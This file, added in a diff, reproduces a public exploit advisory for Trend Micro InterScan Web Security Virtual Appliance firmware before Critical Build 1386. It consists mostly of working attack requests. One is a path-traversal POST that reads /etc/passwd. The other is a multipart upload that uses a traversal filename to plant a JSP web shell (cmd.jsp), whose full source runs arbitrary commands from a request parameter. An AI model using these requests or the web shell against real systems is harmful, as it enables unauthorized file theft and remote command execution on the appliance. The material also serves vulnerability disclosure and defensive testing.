@@ -1,0 +1,219 @@
+source: http://www.securityfocus.com/bid/41072/info
+
+Trend Micro InterScan Web Security Virtual Appliance is prone to multiple vulnerabilities.
+
+Exploiting these issues can allow an attacker to download or upload arbitrary files to the system. This may aid in further attacks.
+
+Firmware versions prior to Trend Micro InterScan Web Security Virtual Appliance Critical Build 1386 are vulnerable.
+
+==============================download==============================
+
+POST /servlet/com.trend.iwss.gui.servlet.exportreport HTTP/1.1
+
+Host: xxx.xxx.xx.xx:1812
+
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-us,en;q=0.5
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+
+Keep-Alive: 300
+
+Proxy-Connection: keep-alive
+
+Referer: http://xxx.xxx.xx.xx:1812/summary_threat.jsp
+
+Cookie: JSESSIONID=D122F55EA4D2A5FA1E7AE4582085F370
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 99
+
+ 
+
+op=refresh&summaryinterval=7&exportname=../../../../../../../../../../etc/passwd&exportfilesize=443
+
+
+
+==============================upload==============================
+
+POST /servlet/com.trend.iwss.gui.servlet.XMLRPCcert?action=import HTTP/1.1
+
+Host: xx.xx.xx.xx:1812
+
+User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-us,en;q=0.5
+
+Accept-Encoding: gzip,deflate
+
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+
+Keep-Alive: 300
+
+Proxy-Connection: keep-alive
+
+Referer: http://xx.xx.xx.xx:1812 
+
+Cookie: JSESSIONID=9072F5BC86BD450CFD8B88613FFD2F80
+
+Content-Type: multipart/form-data; boundary=---------------------------80377104394420410598722900
+
+Content-Length: 2912
+
+ 
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="op"
+
+save
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="defaultca"
+
+yes
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="importca_certificate"; filename="../../../../../../../../../../../../../../../../../usr/iwss/AdminUI/tomcat/webapps/ROOT/cmd.jsp"
+
+ 
+
+Content-Type: application/octet-stream
+
+ 
+
+<%@ page import="java.util.*,java.io.*"%>
+
+<%%>
+
+<HTML><BODY>
+
+<FORM METHOD="GET" NAME="myform" ACTION="">
+
+<INPUT TYPE="text" NAME="cmd">
+
+<INPUT TYPE="submit" VALUE="Send">
+
+</FORM>
+
+<pre>
+
+<%
+
+if (request.getParameter("cmd") != null) {
+
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+
+        OutputStream os = p.getOutputStream();
+
+        InputStream in = p.getInputStream();
+
+        DataInputStream dis = new DataInputStream(in);
+
+        String disr = dis.readLine();
+
+        while ( disr != null ) {
+
+                out.println(disr); 
+
+                disr = dis.readLine(); 
+
+                }
+
+        }
+
+%>
+
+</pre>
+
+</BODY></HTML>
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="importca_key"; filename="../../../../../../../../../../../../../../../../../usr/iwss/AdminUI/tomcat/webapps/ROOT/cmd.jsp"
+
+ 
+
+<%@ page import="java.util.*,java.io.*"%>
+
+<%%>
+
+<HTML><BODY>
+
+<FORM METHOD="GET" NAME="myform" ACTION="">
+
+<INPUT TYPE="text" NAME="cmd">
+
+<INPUT TYPE="submit" VALUE="Send">
+
+</FORM>
+
+<pre>
+
+<%
+
+if (request.getParameter("cmd") != null) {
+
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+
+        OutputStream os = p.getOutputStream();
+
+        InputStream in = p.getInputStream();
+
+        DataInputStream dis = new DataInputStream(in);
+
+        String disr = dis.readLine();
+
+        while ( disr != null ) {
+
+                out.println(disr); 
+
+                disr = dis.readLine(); 
+
+                }
+
+        }
+
+%>
+
+</pre>
+
+</BODY></HTML>
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="importca_passphrase"
+
+ 
+
+test
+
+ 
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="importca_2passphrase"
+
+test
+
+-----------------------------80377104394420410598722900
+
+Content-Disposition: form-data; name="beErrMsg"
+
+imperr
+
+-----------------------------80377104394420410598722900--
